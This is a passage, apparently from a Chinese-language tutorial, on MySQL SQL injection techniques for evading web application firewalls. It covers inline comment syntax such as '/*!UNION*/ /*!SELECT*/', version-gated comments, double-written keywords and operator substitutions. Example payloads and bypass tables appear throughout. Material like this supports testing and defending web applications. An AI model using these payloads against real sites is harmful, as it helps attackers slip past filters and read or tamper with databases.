...
**⚠️ 重要提醒**：`/**/` 在 MySQL 解析器中被当作空白符（等价于空格），所以**只能替代关键字之间的空格**，不能拆写在关键字内部。例如 `O/**/R` 会被解析为 `O` 和 `R` 两个 token，不再是 `OR` 关键字，导致语法错误。
...
**正确用法场景B：绕过关键字检测** —— 使用 MySQL 内联注释 `/*!keyword*/`

这也是 `/**/` 最容易被误解的地方：绕关键字过滤用的不是普通注释，而是 **MySQL 特有的内联注释语法 `/*!...*/`**，其中的内容依然会被 MySQL 执行：

```sql
-- ✅ 内联注释中的关键字会被执行，且不被普通 WAF 识别为关键字
/*!UNION*/ /*!SELECT*/ 1,2,3
/*!OR*/ 1=1
/*!AND*/ 1=1

-- 版本控制内联注释：仅在特定 MySQL 版本及以上执行
/*!80000SELECT*/ 1   -- MySQL 8.0+ 执行，低版本忽略
/*!50000UNION*/ 1,2  -- MySQL 5.0+
```

**❌ 常见错误写法（写在关键字内部会破坏关键字）**：

```sql
-- 以下写法都是错误的，/**/ 会拆散关键字导致语法错误
-- O/**/R          → 变成 O 和 R 两个 token，语法错误
-- SEL/**/ECT      → 变成 SEL 和 ECT，语法错误  
-- UN/**/ION       → 变成 UN 和 ION，语法错误
-- AN/**/D         → 变成 AN 和 D，语法错误
```
...
使用 `/*!keyword*/` 包裹关键字，WAF 可能不识别，但 MySQL 会执行：
...
-- 4. 混合使用注释（注意：/**/不能写在关键字内部，以下写法错误的）
-- ❌ id=-1 UN/**/ION/*!SELECT*/1,2,3  -- 错误！UN/**/ION 拆散了关键字
-- ✅ 正确用法：
id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
```
...
|-------------|-----------|-----------|-----------|-----------|-----------|
| **OR** | `\|\|`（符号） | `OORR`（双写） | `/*!OR*/`（内联注释） | `\|`（位运算） | `XOR`（异或） |
| **AND** | `&&`（符号） | `ANANDD`（双写） | `/*!AND*/`（内联注释） | `&`（位运算） | `NOT !=`（反逻辑） |
...
| **UNION** | `UNUNIONION`（双写） | `/*!UNION*/`（内联） | 大小写 `Union` | 报错注入替代 | 盲注替代 |
| **SELECT** | `SELSELECTECT`（双写） | `/*!SELECT*/`（内联） | 大小写 `Select` | VALUES 替代（8+） | — |
| **注释符 ** | `/*!...*/`（内联） | `#`（MySQL） | `--`（标准） | — | — |
...
```
UNION SELECT        →   /*!UNION*/ /*!SELECT*/   （内联注释）
OR 1=1              →   || 1=1
AND 1=1             →   && 1=1
空格                 →   /**/ 或 ()
=                   →   LIKE 或 IN
